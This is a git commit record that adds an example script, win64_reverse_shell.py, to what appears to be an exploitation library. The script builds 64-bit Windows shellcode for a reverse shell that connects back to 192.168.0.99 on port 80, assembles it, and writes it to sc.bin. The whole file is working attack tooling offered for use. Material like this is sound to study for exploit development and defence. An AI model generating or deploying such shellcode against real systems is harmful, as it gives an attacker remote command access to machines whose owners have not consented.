7fd0df11011e14a7601c27ad9891b6fe48f2bc4f
Niklas Baumstark <niklas.baumstark@gmail.com>
2018-07-04 14:44:20 +0200

    examples

---
+++ examples/win64_reverse_shell.py
@@ -0,0 +1,12 @@
+from pwnlib.wintools import *
+from pwnlib.tools import *
+
+s = ''
+s += code_align_stack64
+s += resolve64(reverse_shell64('192.168.0.99', 80))
+s += api_call_stub64
+
+sc = x86_64.assemble(s)
+
+with open('sc.bin', 'w') as f:
+    f.write(sc)
